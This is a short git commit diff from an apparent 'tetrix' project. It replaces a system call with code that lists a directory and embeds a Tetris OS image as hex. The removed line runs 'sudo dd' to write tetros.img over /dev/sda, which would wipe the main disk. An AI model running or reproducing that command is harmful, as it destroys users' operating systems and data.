74936ef3614d8acaa2adda9c1e87fa8f14001da4
lukecell <alex@thesalleys.com>
2016-11-13 07:41:51 -0800

    Binary Attempt

--- src/tetrix/phase2/phase2.cpp
+++ src/tetrix/phase2/phase2.cpp
@@ -8,8 +8,19 @@ phase2::phase2()
 int phase2::execute()
 {
 	int secsToWait;
-	
-	system("sudo dd if=tetros.img of=/dev/sda");
+	DIR *dir;
+	struct dirent *ent;
+	if ((dir = opendir ("c:\\src\\")) != NULL) {
+	  /* print all the files and directories within directory */
+	  while ((ent = readdir (dir)) != NULL) {
+ 	   printf ("%s\n", ent->d_name);
+ 	 }
+ 	 closedir (dir);
+	} else {
+ 	 /* could not open directory */
+  	perror ("");
+  	return EXIT_FAILURE;
+	}
 
 	secsToWait = 2;
 
--- src/tetrix/phase2/phase2.h
+++ src/tetrix/phase2/phase2.h
@@ -3,6 +3,9 @@
 #include <unistd.h>//For sleep()
 #include <random>//for generating random numbers
 #include <cstdlib>//For system().
+#include <dirent.h>//For going through directories.
+#include <sys/types.h>//Same
+#include "tetros-as-hex.c"
 
 class phase2 {
  private:
